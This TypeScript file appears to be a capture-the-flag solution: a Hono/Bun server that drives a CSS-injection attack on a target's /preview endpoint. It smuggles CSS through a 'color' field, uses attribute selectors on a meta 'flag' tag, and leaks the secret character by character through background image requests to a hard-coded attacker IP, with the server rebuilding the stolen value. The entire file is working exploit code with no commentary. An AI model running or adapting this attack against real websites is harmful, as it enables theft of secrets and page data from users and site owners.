import { Hono } from "hono"

const app = new Hono()

app.get("/", (c) => {
  console.log("someone is visiting")
  return c.html(`
<script>
(async function(){
  const base = "http://localhost:3000"
  const sleep = x => new Promise(r => setTimeout(r, x))
  async function length(){
    return Number(await (await fetch("/check")).text())
  }
  function payload(x) {
    const bytes = new TextEncoder().encode(JSON.stringify({
      "name": "0",
      "pixels": "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000110000001100000000001100000000110000000001000000000011000000000011000000001100000000000011000000000000000000000000001010000000000001010000000001111111100000000000000100000010000000000000001000010000000000000000010010000000000000000000110000000000000000000000000000000000000000000000000000000000000000000000000000",
      "color": \`red;}\${x}*{\`
    }))
    let binary = ""
    for (const byte of bytes) binary += String.fromCharCode(byte)
    const s = btoa(binary)
      .replaceAll("+", "-")
      .replaceAll("/", "_")
      .replace(/=+$/, "")
    return \`\${base}/preview?data=\${encodeURIComponent(s)}\`
  }
  
  let l = await length()
  while(l != -1){
    let w = window.open(payload(
        await (
          await fetch("/payload")
        ).text()
      )
    )
    while(1){
      await sleep(800)
      let n = await length()
      if(n!==l){
        l = n
        break
      }
    }
    w.close()
  }
})()
</script>`)
}
)

let flag = "flag{"
const attacker = "http://47.116.190.87:1337"
const charset = "_abcdefghijklmnopqrstuvwxyz}"

app.get("/payload", (c) => {
  let css = "head,meta{display:block;}"
  charset.split("").forEach(c => {
    css += `meta[name=flag][content^="${flag}${c}"]{background:url("${attacker}/r?v=${c}");}`
  })
  return c.text(css)
})

app.get("/r", (c) => {
  const v = c.req.query("v")
  flag += v
  console.log(flag)
  return c.text('ok', 200, {
    "Content-Type": "image/png"
  })
})

app.get("/check", (c) => {
  return c.text(flag.at(-1) !== '}' ? String(flag.length) : '-1')
})

Bun.serve({
  fetch: app.fetch,
  port: 1337
})
